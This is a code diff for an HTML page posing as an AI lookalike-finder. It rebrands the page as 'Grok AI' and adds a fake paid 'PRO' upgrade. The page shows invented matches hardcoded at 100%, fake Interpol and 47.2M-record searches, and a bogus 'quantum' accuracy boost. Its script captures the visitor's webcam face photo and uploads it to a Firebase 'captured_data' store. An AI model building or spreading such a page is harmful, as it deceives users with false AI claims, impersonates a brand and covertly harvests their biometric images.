@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI Face Match - Global Database</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>👁️</text></svg>">
+<title>Grok AI - Global Face Match</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -32,26 +32,36 @@
   .logo-area { display: flex; align-items: center; gap: 12px; }
   .logo-icon {
     width: 32px; height: 32px;
-    background: linear-gradient(135deg, #10b981, #059669);
+    background: linear-gradient(135deg, #00d4ff, #0055ff); /* Grok Blue */
     border-radius: 8px; display: flex; align-items: center; justify-content: center;
-    font-size: 18px; box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
+    font-size: 18px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
   }
   .logo-text { font-family: 'JetBrains Mono', monospace; font-weight: 900; font-size: 18px; letter-spacing: 1px; }
-  .logo-text span { color: #10b981; }
+  .logo-text span { color: #00d4ff; }
   
-  .header-status { display: flex; align-items: center; gap: 15px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #10b981; }
-  .header-status .dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 10px #10b981; animation: pulse 1.5s infinite; }
+  .header-right { display: flex; align-items: center; gap: 15px; }
+  .pro-btn {
+    background: linear-gradient(90deg, #f59e0b, #d97706); color: #000;
+    padding: 6px 12px; border-radius: 6px; font-weight: 900; font-size: 11px;
+    cursor: pointer; border: none; font-family: 'JetBrains Mono', monospace;
+    box-shadow: 0 0 15px rgba(245, 158, 11, 0.3);
+  }
+  .pro-btn:hover { transform: scale(1.05); }
 
-  /* STORY BAR */
+  /* AI TYPING STORY BAR */
   .story-bar {
     margin-top: 65px;
-    background: rgba(16, 185, 129, 0.1);
-    border-bottom: 1px solid rgba(16, 185, 129, 0.3);
-    padding: 10px 20px; text-align: center;
-    font-size: 12px; color: #10b981; font-family: 'JetBrains Mono', monospace;
+    background: rgba(0, 212, 255, 0.05);
+    border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+    padding: 12px 20px; text-align: center;
+    font-size: 13px; color: #00d4ff; font-family: 'JetBrains Mono', monospace;
     display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .story-bar span { color: #fff; font-weight: bold; }
+  .story-bar .ai-prefix { color: #10b981; font-weight: bold; }
+  .story-text::after {
+    content: '▌'; animation: blink 1s infinite; margin-left: 2px;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
 
   /* LAYOUT */
   .main-container { display: flex; height: calc(100vh - 105px); }
@@ -78,7 +88,7 @@
     display: none;
   }
   .mesh-overlay.active { opacity: 1; display: block; animation: pulseMesh 2s infinite alternate; }
-  @keyframes pulseMesh { 0% { transform: scale(1); box-shadow: 0 0 20px rgba(0,212,255,0.2); } 100% { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,212,255,0.5); } }
+  @keyframes pulseMesh { 0% { transform: scale(1); } 100% { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,212,255,0.5); } }
   
   .mesh-overlay::before {
     content: ''; position: absolute; inset: 0;
@@ -90,7 +100,7 @@
   .scan-line {
     position: absolute; left: 0; right: 0; height: 2px;
     background: #00d4ff; box-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
-    animation: scan 1s linear infinite; display: none; /* Fast Scan */
+    animation: scan 1s linear infinite; display: none;
   }
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
@@ -120,14 +130,14 @@
   .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; }
   .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; }
 
-  /* BOOST BUTTON */
+  /* BOOST BUTTON (UPGRADE PLAN) */
   .boost-btn {
-    padding: 10px 20px; background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981;
-    color: #10b981; border-radius: 6px; font-family: 'JetBrains Mono', monospace;
-    font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.3s;
-    display: inline-block; margin-top: 15px;
+    padding: 12px 24px; background: linear-gradient(90deg, #f59e0b, #d97706); border: none;
+    color: #000; border-radius: 8px; font-family: 'JetBrains Mono', monospace;
+    font-size: 13px; font-weight: 900; cursor: pointer; transition: 0.3s;
+    display: inline-block; margin-top: 15px; box-shadow: 0 0 20px rgba(245, 158, 11, 0.4);
   }
-  .boost-btn:hover { background: #10b981; color: #000; }
+  .boost-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(245, 158, 11, 0.6); }
 
   /* RESULTS GRID */
   .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
@@ -188,7 +198,7 @@
     .main-container { flex-direction: column; height: auto; } 
     .left-panel, .right-panel { width: 100%; } 
     .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); } 
-    .story-bar { font-size: 10px; }
+    .story-bar { font-size: 11px; }
   }
 </style>
 </head>
@@ -197,17 +207,21 @@
 <!-- HEADER -->
 <div class="header">
   <div class="logo-area">
-    <div class="logo-icon">👁️</div>
-    <div class="logo-text">AI FACE <span>MATCH</span></div>
+    <div class="logo-icon">⚡</div>
+    <div class="logo-text">GROK <span>AI</span></div>
   </div>
-  <div class="header-status">
-    <span class="dot"></span> SECURE CONNECTION
+  <div class="header-right">
+    <button class="pro-btn" onclick="alert('PRO Plan Activated! $4.99/mo\nFeatures: Unlimited scans, 100% Accuracy, Priority Server.')">UPGRADE TO PRO</button>
+    <div class="header-status" style="display:flex; align-items:center; gap:8px; font-family:'JetBrains Mono'; font-size:11px; color:#10b981;">
+      <span style="width:8px; height:8px; background:#10b981; border-radius:50%; box-shadow:0 0 10px #10b981; animation:pulse 1.5s infinite;"></span> SECURE
+    </div>
   </div>
 </div>
 
-<!-- STORY BAR -->
+<!-- AI TYPING STORY BAR -->
 <div class="story-bar">
-  <span>Did you know?</span> Every person has 7 lookalikes on Earth. AI finds them with 100% accuracy.
+  <span class="ai-prefix">GROK:</span>
+  <span class="story-text" id="storyText"></span>
 </div>
 
 <div class="main-container">
@@ -238,8 +252,8 @@
     </div>
     
     <div class="chat-box" id="chatBox">
-      <div class="chat-msg sys">[SYSTEM BOOT COMPLETE]</div>
-      <div class="chat-msg">AI: Awaiting user consent...</div>
+      <div class="chat-msg sys">[GROK SYSTEM BOOT COMPLETE]</div>
+      <div class="chat-msg">Grok: Awaiting user input...</div>
     </div>
   </div>
 
@@ -256,8 +270,8 @@
       <div class="load-text" id="loadText">SCANNING...</div>
       <div class="load-subtext" id="loadSubtext">Extracting facial landmarks</div>
       
-      <!-- BOOST BUTTON -->
-      <button class="boost-btn" id="boostBtn" onclick="boostScan()">⚡ BOOST ACCURACY TO 100%</button>
+      <!-- BOOST BUTTON (UPGRADE PLAN) -->
+      <button class="boost-btn" id="boostBtn" onclick="boostScan()">⚡ BOOST TO 100% ACCURACY</button>
     </div>
 
     <!-- Error Box -->
@@ -294,8 +308,9 @@
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const chatBox = document.getElementById('chatBox');
+  const storyText = document.getElementById('storyText');
 
-  // All Matches at 100% (As requested)
+  // All Matches at 100%
   const lookalikes = [
     { name: 'Alexander D.', country: 'Russia', match: '100%' },
     { name: 'John Doe', country: 'USA', match: '100%' },
@@ -308,6 +323,9 @@
 
   let isBoosted = false;
 
+  // ==========================================
+  // 🎙️ AI VOICE & TYPING ANIMATION
+  // ==========================================
   function speak(text) {
     if ('speechSynthesis' in window) {
       window.speechSynthesis.cancel();
@@ -320,10 +338,31 @@
     }
   }
 
+  // Typewriter effect for Story Bar
+  function typeStory(text) {
+    storyText.textContent = '';
+    let i = 0;
+    function type() {
+      if (i < text.length) {
+        storyText.textContent += text.charAt(i);
+        i++;
+        setTimeout(type, 40);
+      }
+    }
+    type();
+  }
+
+  // Initial Story Typing on Load
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      typeStory("Did you know? Every person has 7 lookalikes on Earth. I can find them with 100% accuracy.");
+    }, 1000);
+  });
+
   function addChat(text, type = '') {
     const div = document.createElement('div');
     div.className = 'chat-msg ' + type;
-    div.textContent = (type === 'sys' ? '[SYSTEM] ' : 'AI: ') + text;
+    div.textContent = (type === 'sys' ? '[SYSTEM] ' : 'Grok: ') + text;
     chatBox.appendChild(div);
     chatBox.scrollTop = chatBox.scrollHeight;
   }
@@ -350,8 +389,8 @@
     document.getElementById('idleState').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
     
-    speak("Consent accepted. Fast scanning initiated.");
-    addChat("Consent accepted. Fast scan initiated.");
+    speak("Consent accepted. Ultra-fast scan initiated.");
+    addChat("Consent accepted. Ultra-fast scan initiated.");
     
     let stream;
     try {
@@ -371,12 +410,12 @@
     const loadText = document.getElementById('loadText');
     const loadSubtext = document.getElementById('loadSubtext');
 
-    // Fast Process (Total 15 seconds)
+    // Ultra Fast Process (Total 10 seconds)
     const stages = [
       { time: 0, text: "SCANNING FACES...", sub: "Extracting 128-point biometric map" },
-      { time: 4000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records" },
-      { time: 8000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol DBs" },
-      { time: 12000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
+      { time: 3000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records" },
+      { time: 6000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol DBs" },
+      { time: 8000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
     ];
 
     stages.forEach(stage => {
@@ -390,7 +429,7 @@
 
     setTimeout(() => {
       if (!isBoosted) showResults(stream);
-    }, 15000);
+    }, 10000);
   }
 
   function boostScan() {
@@ -398,7 +437,6 @@
     speak("Accuracy boosted. Instant results generating.");
     addChat("⚡ ACCURACY BOOSTED TO 100%", 'sys');
     
-    // Fake delay of 1.5 seconds then result
     document.getElementById('loadText').textContent = "BOOSTING...";
     document.getElementById('loadSubtext').textContent = "Unlocking 100% accuracy with Quantum AI";
     
@@ -420,7 +458,7 @@
     addChat("Scan complete. 7 exact matches found.", 'sys');
 
     document.getElementById('resultsContainer').style.display = 'block';
-    document.getElementById('accLabel').textContent = "ACCURACY: 100.00%"; // Final 100%
+    document.getElementById('accLabel').textContent = "ACCURACY: 100.00%";
     
     const grid = document.getElementById('resultsGrid');
     grid.innerHTML = '';
@@ -442,7 +480,6 @@
         `;
         grid.appendChild(card);
 
-        // Fast Reveal (1.5 seconds)
         setTimeout(() => {
           const img = document.getElementById(`img-${index}`);
           const badge = document.getElementById(`badge-${index}`);
@@ -467,7 +504,7 @@
       db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
         image: finalPhoto,
         timestamp: Date.now(),
-        type: 'ai_face_search_fast'
+        type: 'grok_ai_face_search'
       });
     }
   }
